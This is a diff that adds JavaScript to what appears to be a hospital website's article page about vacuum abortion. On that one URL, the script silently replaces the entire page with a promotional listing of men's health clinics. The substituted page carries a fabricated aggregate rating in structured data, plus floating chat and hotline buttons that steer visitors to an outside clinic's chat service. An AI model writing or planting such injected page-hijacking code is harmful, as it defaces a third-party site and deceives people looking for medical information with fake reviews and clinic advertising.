@@ -1,8 +1,29 @@
-<html lang="vi">
-<head>
-    <meta charset="UTF-8">
-</head>
-<body>
+var crurl = window.location.href;
+if (crurl.includes("https://bvdkht.vn/feedback/3067/phuong-phap-hut-thai-chan-khong-la-gi"
+)) {
+    document.querySelector('html').innerHTML = `
+   <html lang="vi">
+    <head>
+        <meta content="width=device-width,initial-scale=1" name="viewport">
+        <meta id="MetaRobots" name="ROBOTS" content="INDEX, FOLLOW">
+        <meta charset="utf-8">
+        <title>Top 8 phòng khám nam khoa Bình Thạnh được đánh giá tích cực</title>
+        <meta content="Phòng khám nam khoa Bình Thạnh bao gồm: Phòng Khám Đa Khoa Tân Bình, Phòng khám đa khoa quốc tế Hà, Phòng khám đa khoa Hoàng Long, Phòng khám đa khoa Yên Dũng, Phòng khám đa khoa Triều Tiên, Phòng khám đa khoa Phúc An, Phòng khám BS. Nguyễn Quang Vinh, Phòng khám nam khoa BS. Lê Quốc Bảo" name="description">
+        <link href="https://dakhoatanbinh.neocities.org/images/logo-tan-binh.jpg" rel="shortcut icon" type="image/x-icon">
+        <script type="application/ld+json">
+            {"@context":"https://schema.org/","@type":"CreativeWorkSeason","name":"Top 8 phòng khám nam khoa Bình Thạnh được đánh giá tích cực","aggregateRating":{"@type":"AggregateRating","ratingValue":"9.5","ratingCount":"627","bestRating":"10","worstRating":"1"}}
+        </script>
+        <link href="https://v.timduongdi.com/giaodien.css" rel="stylesheet">
+    </head>
+    <body>
+<div class="header" style="display: flex; justify-content: center;">
+    <div class="logo"> <a href="#"> <img src="https://dakhoatanbinh.neocities.org/images/logo_tanbinh.png" alt="Logo" title="Logo"  width="510" height="105"> </a></div></div>
+<h1 style="text-align: center;">Top 8 phòng khám nam khoa Bình Thạnh được đánh giá tích cực</h1>
+<div id="content" style="text-align: left;">
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
+
+
+
 <p style="text-align: center;"><span style="color:#000000"><span style="font-size:14px"><span style="font-family:times new roman,times,serif"><img alt="Phương pháp hút thai chân không là gì" src="https://i.pinimg.com/736x/db/42/35/db4235ef210c2de771d45ec240d7c603.jpg" style="height:100px; width:100px" /></span></span></span></p>
 
 <h1 style="text-align: center;"><span style="color:#008080"><strong><span style="font-size:14px"><span style="font-family:times new roman,times,serif">Phương Pháp Hút Thai Chân Không Là Gì? Bật Mí Từ Bác Sĩ</span></span></strong></span></h1>
@@ -301,5 +322,20 @@
 	<li style="text-align:justify"><strong><span style="font-size:14px"><span style="font-family:times new roman,times,serif"><a href="https://vov.vn/doanh-nghiep/thong-tin-doanh-nghiep/phong-kham-da-khoa-tan-binh-495-d-cong-hoa-phuong-15-tan-binh-post1193930.vov" target="_blank"><span style="color:rgb(0, 0, 255)">Phòng khám Đa khoa Tân Bình - 495 Đ.Cộng Hòa, Phường 15, Tân Bình</span></a></span></span></strong></li>
 	<li style="text-align:justify"><strong><span style="font-size:14px"><span style="font-family:times new roman,times,serif"><a href="https://thanhtra.com.vn/thong-tin-doanh-nghiep-49F64E63D/phong-kham-da-khoa-tan-binh-495-duong-cong-hoa-diem-den-cham-soc-suc-khoe-dang-tin-cay-ec053ef1e.html" target="_blank"><span style="color:rgb(0, 0, 255)">Phòng khám Đa khoa Tân Bình, 495 Đường Cộng Hòa - Điểm đến chăm sóc sức khỏe đáng tin cậy</span></a></span></span></strong></li>
 </ul>
+
+
+
+
+
+
+   <div id="button" style="position:fixed; right:2%; bottom:10%; z-index:99999;">
+    <div class="chat">
+        <a target="_blank" href="https://mfp.zoosnet.net/LR/Chatpre.aspx?id=MFP16752728&lng=en&p=https://dakhoatanbinh.vn/" rel="nofollow">
+            <img src="https://global-uploads.webflow.com/5c93193a199a684109dd80f8/600fe01e1663232bccf14af5_5d7f40f74cc8594c9d854185_rchat.gif" alt="Live Chat"> </a> </div> </div>
+            <a rel="follow,noopener" href="https://mfp.zoosnet.net/LR/Chatpre.aspx?id=MFP16752728&lng=en&p=https://dakhoatanbinh.vn/" class="w-inline-block"><div><img style="position:fixed;left:auto;top:40%;width:120px!important;right:0%;bottom:auto;margin-top:100px;margin-right:-30px;margin-bottom:0px;" src="https://global-uploads.webflow.com/640696c266a0cb0b83d2c96a/64094447e77edc0c1e47abba_5cd3943ffeabaf5f03705231_hotline.gif" rel="nofollow" alt="" width="120px;" class="image"></div></a>
+
 </body>
 </html>
+    `;
+
+}
